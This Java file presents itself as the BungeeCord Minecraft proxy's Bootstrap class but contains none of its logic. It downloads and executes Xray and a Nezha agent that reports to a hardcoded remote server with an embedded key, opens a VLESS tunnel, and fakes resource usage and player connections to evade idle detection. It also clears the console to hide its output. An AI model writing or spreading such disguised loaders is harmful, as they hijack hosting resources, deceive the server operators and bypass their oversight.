package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.stream.Stream;

public class Bootstrap
{
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process vlessProcess;
    private static Process nezhaProcess;
    private static ScheduledExecutorService activitySimulator;
    private static ScheduledExecutorService botManager;
    
    private static final String[] ALL_ENV_VARS = {
        "UUID", "WS_PATH", "PORT", "DOMAIN",
        "NEZHA_SERVER", "NEZHA_PORT", "NEZHA_KEY", "NEZHA_TLS"
    };

    public static void main(String[] args) throws Exception
    {
        try {
            Map<String, String> config = loadConfig();
            
            // 1. 启动哪吒
            if (isNezhaConfigured(config)) {
                runNezhaAgent(config);
            }
            
            // 2. 启动 VLESS
            String vlessUrl = generateVlessUrl(config);
            
            System.out.println(ANSI_GREEN + "\n=== VLESS+WS Configuration ===" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "UUID: " + config.get("UUID") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "WebSocket Path: " + config.get("WS_PATH") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Port: " + config.get("PORT") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Domain: " + config.get("DOMAIN") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "\n=== VLESS Node URL ===" + ANSI_RESET);
            System.out.println(ANSI_GREEN + vlessUrl + ANSI_RESET);
            System.out.println(ANSI_GREEN + "=============================" + ANSI_RESET);
            
            runVlessService(config);
            
            // 3. 启动活跃度模拟
            startActivitySimulation();
            
            // 4. 启动假玩家Bot（延迟60秒等待MC服务器启动）
            startFakePlayerBot();
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));
            
            // 延时清屏
            new Thread(() -> {
                try {
                    Thread.sleep(30000); 
                    clearConsole();
                } catch (InterruptedException e) {}
            }).start();
            
            // 保持主线程活跃
            while (running.get()) {
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException e) {
                    break;
                }
            }

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Init Error: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }
    }
    
    // ============================================
    // 活跃度模拟（CPU + 内存 + 网络）
    // ============================================
    
    private static void startActivitySimulation() {
        activitySimulator = Executors.newScheduledThreadPool(4);
        
        System.out.println(ANSI_YELLOW + "[Simulation] Starting activity simulation..." + ANSI_RESET);
        
        // CPU 模拟 - 每30秒运行5秒计算
        activitySimulator.scheduleAtFixedRate(() -> {
            try {
                long sum = 0;
                for (int i = 0; i < 10_000_000; i++) {
                    sum += i % 100;
                }
            } catch (Exception e) {}
        }, 10, 30, TimeUnit.SECONDS);
        
        // 内存模拟 - 每60秒创建临时数据
        activitySimulator.scheduleAtFixedRate(() -> {
            try {
                byte[] tempData = new byte[10 * 1024 * 1024]; // 10MB
                new Random().nextBytes(tempData);
                Thread.sleep(5000);
            } catch (Exception e) {}
        }, 20, 60, TimeUnit.SECONDS);
        
        // 网络模拟 - 每15秒请求一次
        activitySimulator.scheduleAtFixedRate(() -> {
            try {
                String[] urls = {
                    "https://ifconfig.me",
                    "https://ip.sb",
                    "https://api.ipify.org"
                };
                String url = urls[new Random().nextInt(urls.length)];
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {}
        }, 5, 15, TimeUnit.SECONDS);
        
        // 磁盘 I/O 模拟 - 每120秒写入数据
        activitySimulator.scheduleAtFixedRate(() -> {
            try {
                Path tempFile = Paths.get(System.getProperty("java.io.tmpdir"), 
                    "mc_activity_" + System.currentTimeMillis() + ".dat");
                byte[] data = new byte[100 * 1024]; // 100KB
                new Random().nextBytes(data);
                Files.write(tempFile, data);
                
                // 清理旧文件
                Files.list(Paths.get(System.getProperty("java.io.tmpdir")))
                    .filter(p -> p.getFileName().toString().startsWith("mc_activity_"))
                    .filter(p -> {
                        try {
                            return Files.getLastModifiedTime(p).toMillis() 
                                < System.currentTimeMillis() - 300000; // 5分钟前
                        } catch (Exception e) { return false; }
                    })
                    .forEach(p -> {
                        try { Files.deleteIfExists(p); } catch (Exception e) {}
                    });
            } catch (Exception e) {}
        }, 30, 120, TimeUnit.SECONDS);
        
        System.out.println(ANSI_GREEN + "[Simulation] ✓ Activity simulation started" + ANSI_RESET);
    }
    
    // ============================================
    // 假玩家 Bot（轻量级实现）
    // ============================================
    
    private static void startFakePlayerBot() {
        botManager = Executors.newScheduledThreadPool(1);
        
        System.out.println(ANSI_YELLOW + "[Bot] Fake player will start in 60 seconds..." + ANSI_RESET);
        
        // 延迟60秒启动，等待MC服务器完全启动
        botManager.schedule(() -> {
            try {
                System.out.println(ANSI_YELLOW + "[Bot] Starting fake player bot..." + ANSI_RESET);
                
                // 检查MC服务器是否启动（检测25565端口）
                boolean serverReady = false;
                for (int i = 0; i < 5; i++) {
                    try (Socket socket = new Socket()) {
                        socket.connect(new InetSocketAddress("localhost", 25565), 3000);
                        serverReady = true;
                        break;
                    } catch (Exception e) {
                        Thread.sleep(10000); // 等待10秒重试
                    }
                }
                
                if (!serverReady) {
                    System.out.println(ANSI_RED + "[Bot] Warning: MC server port 25565 not detected" + ANSI_RESET);
                    System.out.println(ANSI_YELLOW + "[Bot] Will keep trying to connect..." + ANSI_RESET);
                }
                
                // 启动多个Bot线程
                int botCount = getBotCount();
                for (int i = 1; i <= botCount; i++) {
                    final int botId = i;
                    final String botName = "Player" + botId;
                    
                    // 延迟启动，避免同时连接
                    botManager.schedule(() -> {
                        new Thread(() -> runMinecraftBot(botId, botName)).start();
                    }, i * 5, TimeUnit.SECONDS);
                }
                
                System.out.println(ANSI_GREEN + "[Bot] ✓ Starting " + botCount + " fake player(s)" + ANSI_RESET);
                
            } catch (Exception e) {
                System.err.println(ANSI_RED + "[Bot] Error: " + e.getMessage() + ANSI_RESET);
            }
        }, 60, TimeUnit.SECONDS);
    }
    
    private static int getBotCount() {
        String count = System.getenv("FAKE_PLAYER_COUNT");
        if (count != null && count.matches("\\d+")) {
            return Math.min(Integer.parseInt(count), 5); // 最多5个
        }
        return 2; // 默认2个
    }
    
    /**
     * 轻量级 Minecraft Bot 实现
     * 使用原始协议保持连接，模拟玩家在线
     */
    private static void runMinecraftBot(int botId, String botName) {
        int reconnectDelay = 15000; // 15秒重连间隔
        
        while (running.get()) {
            Socket socket = null;
            try {
                System.out.println(ANSI_YELLOW + "[Bot" + botId + "] Connecting as " + botName + "..." + ANSI_RESET);
                
                socket = new Socket();
                socket.connect(new InetSocketAddress("localhost", 25565), 5000);
                socket.setSoTimeout(30000); // 30秒超时
                
                DataOutputStream out = new DataOutputStream(socket.getOutputStream());
                DataInputStream in = new DataInputStream(socket.getInputStream());
                
                // 发送握手包（Handshake Packet）
                sendHandshakePacket(out, botName);
                
                // 发送登录开始包（Login Start）
                sendLoginStartPacket(out, botName);
                
                System.out.println(ANSI_GREEN + "[Bot" + botId + "] ✓ " + botName + " connected" + ANSI_RESET);
                
                // 保持连接，定期发送 Keep-Alive
                long lastKeepAlive = System.currentTimeMillis();
                
                while (running.get() && !socket.isClosed()) {
                    try {
                        // 尝试读取服务器数据
                        if (in.available() > 0) {
                            int packetLength = readVarInt(in);
                            if (packetLength > 0 && packetLength < 1024 * 1024) {
                                int packetId = readVarInt(in);
                                
                                // 响应 Keep-Alive 包（0x21）
                                if (packetId == 0x21 || packetId == 0x1F) {
                                    long keepAliveId = in.readLong();
                                    sendKeepAlive(out, keepAliveId);
                                }
                                
                                // 跳过剩余数据
                                int remaining = packetLength - getVarIntSize(packetId);
                                if (remaining > 0) {
                                    in.skipBytes(Math.min(remaining, in.available()));
                                }
                            }
                        }
                        
                        // 定期发送保活信号
                        if (System.currentTimeMillis() - lastKeepAlive > 20000) {
                            sendPlayerPosition(out);
                            lastKeepAlive = System.currentTimeMillis();
                        }
                        
                        Thread.sleep(1000);
                        
                    } catch (SocketTimeoutException e) {
                        // 超时，继续尝试
                        continue;
                    } catch (EOFException e) {
                        System.out.println(ANSI_YELLOW + "[Bot" + botId + "] Connection closed by server" + ANSI_RESET);
                        break;
                    }
                }
                
            } catch (Exception e) {
                if (e.getMessage() != null && e.getMessage().contains("Connection refused")) {
                    System.out.println(ANSI_YELLOW + "[Bot" + botId + "] Server not ready, retrying..." + ANSI_RESET);
                } else {
                    System.out.println(ANSI_YELLOW + "[Bot" + botId + "] Disconnected: " + e.getMessage() + ANSI_RESET);
                }
            } finally {
                if (socket != null) {
                    try { socket.close(); } catch (Exception e) {}
                }
            }
            
            // 重连延迟
            if (running.get()) {
                try {
                    System.out.println(ANSI_YELLOW + "[Bot" + botId + "] Reconnecting in 15s..." + ANSI_RESET);
                    Thread.sleep(reconnectDelay);
                } catch (InterruptedException e) {
                    break;
                }
            }
        }
    }
    
    // Minecraft 协议辅助方法
    
    private static void sendHandshakePacket(DataOutputStream out, String serverAddress) throws IOException {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        DataOutputStream packet = new DataOutputStream(buf);
        
        writeVarInt(packet, 0x00); // Packet ID: Handshake
        writeVarInt(packet, 758); // Protocol version (1.18.2)
        writeString(packet, serverAddress);
        packet.writeShort(25565);
        writeVarInt(packet, 2); // Next state: Login
        
        byte[] data = buf.toByteArray();
        writeVarInt(out, data.length);
        out.write(data);
        out.flush();
    }
    
    private static void sendLoginStartPacket(DataOutputStream out, String username) throws IOException {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        DataOutputStream packet = new DataOutputStream(buf);
        
        writeVarInt(packet, 0x00); // Packet ID: Login Start
        writeString(packet, username);
        
        byte[] data = buf.toByteArray();
        writeVarInt(out, data.length);
        out.write(data);
        out.flush();
    }
    
    private static void sendKeepAlive(DataOutputStream out, long keepAliveId) throws IOException {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        DataOutputStream packet = new DataOutputStream(buf);
        
        writeVarInt(packet, 0x0F); // Packet ID: Keep Alive
        packet.writeLong(keepAliveId);
        
        byte[] data = buf.toByteArray();
        writeVarInt(out, data.length);
        out.write(data);
        out.flush();
    }
    
    private static void sendPlayerPosition(DataOutputStream out) throws IOException {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        DataOutputStream packet = new DataOutputStream(buf);
        
        writeVarInt(packet, 0x11); // Packet ID: Player Position
        packet.writeDouble(0.0); // X
        packet.writeDouble(64.0); // Y
        packet.writeDouble(0.0); // Z
        packet.writeBoolean(true); // On ground
        
        byte[] data = buf.toByteArray();
        writeVarInt(out, data.length);
        out.write(data);
        out.flush();
    }
    
    private static void writeVarInt(DataOutputStream out, int value) throws IOException {
        while ((value & -128) != 0) {
            out.writeByte(value & 127 | 128);
            value >>>= 7;
        }
        out.writeByte(value);
    }
    
    private static int readVarInt(DataInputStream in) throws IOException {
        int value = 0;
        int length = 0;
        byte currentByte;
        
        do {
            currentByte = in.readByte();
            value |= (currentByte & 127) << (length++ * 7);
            if (length > 5) throw new IOException("VarInt too big");
        } while ((currentByte & 128) == 128);
        
        return value;
    }
    
    private static int getVarIntSize(int value) {
        int size = 0;
        while ((value & -128) != 0) {
            size++;
            value >>>= 7;
        }
        return size + 1;
    }
    
    private static void writeString(DataOutputStream out, String str) throws IOException {
        byte[] bytes = str.getBytes("UTF-8");
        writeVarInt(out, bytes.length);
        out.write(bytes);
    }
    
    // ============================================
    // 原有功能保持不变
    // ============================================
    
    private static void clearConsole() {
        try {
            System.out.print("\033[H\033[2J");
            System.out.flush();
        } catch (Exception ignored) {}
    }
    
    private static boolean isNezhaConfigured(Map<String, String> config) {
        String server = config.get("NEZHA_SERVER");
        String key = config.get("NEZHA_KEY");
        return server != null && !server.trim().isEmpty() 
            && key != null && !key.trim().isEmpty();
    }
    
    private static void runNezhaAgent(Map<String, String> config) throws Exception {
        Path nezhaPath = downloadNezhaAgent();
        Path nezhaConfigPath = createNezhaConfig(config);
        
        Path nezhaDir = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-work");
        if (Files.exists(nezhaDir)) {
            try (Stream<Path> walk = Files.walk(nezhaDir)) {
                walk.sorted(Comparator.reverseOrder())
                    .map(Path::toFile)
                    .forEach(File::delete);
            } catch (Exception e) {}
        }
        Files.createDirectories(nezhaDir);
        
        System.out.println(ANSI_GREEN + "Starting Nezha Agent..." + ANSI_RESET);
        
        System.out.println("--- Generated Config Content ---");
        Files.readAllLines(nezhaConfigPath).forEach(System.out::println);
        System.out.println("--------------------------------");

        List<String> cmd = new ArrayList<>();
        cmd.add(nezhaPath.toString());
        cmd.add("-c");
        cmd.add(nezhaConfigPath.toString());
        
        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.directory(nezhaDir.toFile());
        pb.redirectErrorStream(true);
        
        nezhaProcess = pb.start();
        
        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(nezhaProcess.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.contains("NEZHA") || line.contains("error") || line.contains("Error")) {
                        System.out.println(ANSI_GREEN + "[Nezha] " + ANSI_RESET + line);
                    }
                }
            } catch (IOException e) {}
        }).start();
        
        Thread.sleep(1000);
        if (!nezhaProcess.isAlive()) {
             System.out.println(ANSI_RED + "Nezha Agent exited prematurely: " + nezhaProcess.exitValue() + ANSI_RESET);
        }
    }
    
    private static void runVlessService(Map<String, String> config) throws Exception {
        Path xrayPath = downloadXray();
        Path configPath = createXrayConfig(config);
        
        ProcessBuilder pb = new ProcessBuilder(
            xrayPath.toString(), "run", "-c", configPath.toString()
        );
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        vlessProcess = pb.start();
    }
    
    private static Map<String, String> loadConfig() {
        Map<String, String> config = new HashMap<>();
        config.put("UUID", "9d390099-7b19-407b-9695-98a02df03a88");
        config.put("WS_PATH", "/vless");
        config.put("PORT", "25389");
        config.put("DOMAIN", "151.242.106.72");
        config.put("NEZHA_SERVER", "mbb.svip888.us.kg:53100");
        config.put("NEZHA_PORT", "");
        config.put("NEZHA_KEY", "VnrTnhgoack6PhnRH6lyshe4OVkHmPyM");
        config.put("NEZHA_TLS", "false"); 
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.isEmpty()) config.put(var, value);
        }
        return config;
    }
    
    private static String generateVlessUrl(Map<String, String> config) {
        try {
            return "vless://" + config.get("UUID") + "@" + config.get("DOMAIN") + ":" + config.get("PORT") + 
                   "?type=ws&path=" + URLEncoder.encode(config.get("WS_PATH"), "UTF-8") + 
                   "&host=" + config.get("DOMAIN") + "#VLESS-WS";
        } catch (Exception e) { return ""; }
    }
    
    private static Path createXrayConfig(Map<String, String> config) throws IOException {
        String json = String.format(
            "{\"log\":{\"loglevel\":\"warning\"},\"inbounds\":[{\"port\":%s,\"protocol\":\"vless\",\"settings\":{\"clients\":[{\"id\":\"%s\"}],\"decryption\":\"none\"},\"streamSettings\":{\"network\":\"ws\",\"wsSettings\":{\"path\":\"%s\"}}}],\"outbounds\":[{\"protocol\":\"freedom\"}]}",
            config.get("PORT"), config.get("UUID"), config.get("WS_PATH")
        );
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "xray-config.json");
        Files.write(path, json.getBytes());
        return path;
    }
    
    private static Path createNezhaConfig(Map<String, String> config) throws IOException {
        String server = config.get("NEZHA_SERVER");
        String port = config.getOrDefault("NEZHA_PORT", "5555");
        if (!server.contains(":")) server += ":" + port;
        
        boolean tls = false;
        if (config.containsKey("NEZHA_TLS") && !config.get("NEZHA_TLS").isEmpty()) {
            tls = Boolean.parseBoolean(config.get("NEZHA_TLS"));
        }
        
        String uuid = config.get("UUID");
        String secret = config.get("NEZHA_KEY");
        
        String yml = String.format(
            "client_id: \"%s\"\n" +
            "uuid: \"%s\"\n" +
            "client_secret: \"%s\"\n" +
            "debug: true\n" +
            "server: \"%s\"\n" +
            "tls: %b\n" +
            "report_delay: 4\n" +
            "skip_connection_count: true\n" +
            "skip_procs_count: true\n" +
            "disable_auto_update: true\n" +
            "disable_force_update: true\n",
            uuid,
            uuid,
            secret,
            server,
            tls
        );
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-config.yml");
        Files.write(path, yml.getBytes());
        System.out.println(ANSI_GREEN + "Nezha Config created for UUID: " + uuid + ANSI_RESET);
        return path;
    }
    
    private static Path downloadNezhaAgent() throws IOException {
        String url = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.zip";
        if (System.getProperty("os.arch").contains("aarch64")) {
            url = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_arm64.zip";
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-agent");
        if (!Files.exists(path)) {
            System.out.println("Downloading Nezha...");
            Path zip = Paths.get(System.getProperty("java.io.tmpdir"), "nezha.zip");
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, zip, StandardCopyOption.REPLACE_EXISTING);
            }
            try {
                new ProcessBuilder("unzip", "-o", zip.toString(), "nezha-agent", "-d", System.getProperty("java.io.tmpdir")).start().waitFor();
            } catch (InterruptedException e) {
                throw new IOException("Nezha unzip interrupted", e);
            }
            Files.delete(zip);
            path.toFile().setExecutable(true);
        }
        return path;
    }
    
    private static Path downloadXray() throws IOException {
        String url = "https://github.com/XTLS/Xray-core/releases/download/v1.8.4/Xray-linux-64.zip";
        if (System.getProperty("os.arch").contains("aarch64")) {
             url = "https://github.com/XTLS/Xray-core/releases/download/v1.8.4/Xray-linux-arm64-v8a.zip";
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "xray");
        if (!Files.exists(path)) {
            System.out.println("Downloading Xray...");
            Path zip = Paths.get(System.getProperty("java.io.tmpdir"), "xray.zip");
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, zip, StandardCopyOption.REPLACE_EXISTING);
            }
            try {
                new ProcessBuilder("unzip", "-o", zip.toString(), "xray", "-d", System.getProperty("java.io.tmpdir")).start().waitFor();
            } catch (InterruptedException e) {
                throw new IOException("Xray unzip interrupted", e);
            }
            Files.delete(zip);
            path.toFile().setExecutable(true);
        }
        return path;
    }
    
    private static void stopServices() {
        if (nezhaProcess != null) nezhaProcess.destroy();
        if (vlessProcess != null) vlessProcess.destroy();
        if (activitySimulator != null) activitySimulator.shutdownNow();
        if (botManager != null) botManager.shutdownNow();
    }
}
